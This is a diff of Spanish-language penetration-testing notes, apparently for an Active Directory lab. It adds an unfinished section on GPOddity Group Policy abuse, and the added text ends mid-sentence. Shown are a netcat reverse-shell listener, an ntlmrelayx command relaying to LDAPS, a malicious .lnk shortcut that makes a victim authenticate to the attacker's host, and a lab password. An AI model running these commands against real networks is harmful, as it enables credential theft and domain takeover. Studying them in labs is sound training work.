@@ -199,7 +199,22 @@ C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 1889
 Deberemos de darle a Build y esperar la respuesta de la Reverse Shell
 ### Abuso de GPO
 #### GPOddity
-Teniendo en el objetipo permisos de escritura sobre u
+Teniendo en el objetivo permisos de escritura sobre un recurso compartido y haber descubierto por ejemplo que se dedica a automatizar ejecuciones de *.lnk*, y también descubrir que el usuario que lo ejecuta tiene *GenericAll* sobre la política del grupo al que pertenece deberemos intentar explotar esta vulnerabilidad.
 
+```ad-warning
+El firewal debe de estar desactivado
+```
+
+Primero deberemos de acceder al WSL (*WSLToTh3Rescue!*) y ejecutar la herraminta *ntlmrelayx*
+```shell
+sudo ntlmrelayx.py -t ldaps://172.16.2.1 -wh 172.16.100.x --http-port '80,8080' -i --no-smb-server
+```
+
+En nuestra maquina dberemos de crear un acceso directo *.lnk*
+```shell
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Invoke-WebRequest -Uri 'http://172.16.100.X' -UseDefaultCredentials"
+```
+
+Deberemos c
 ## Movimiento Lateral
 
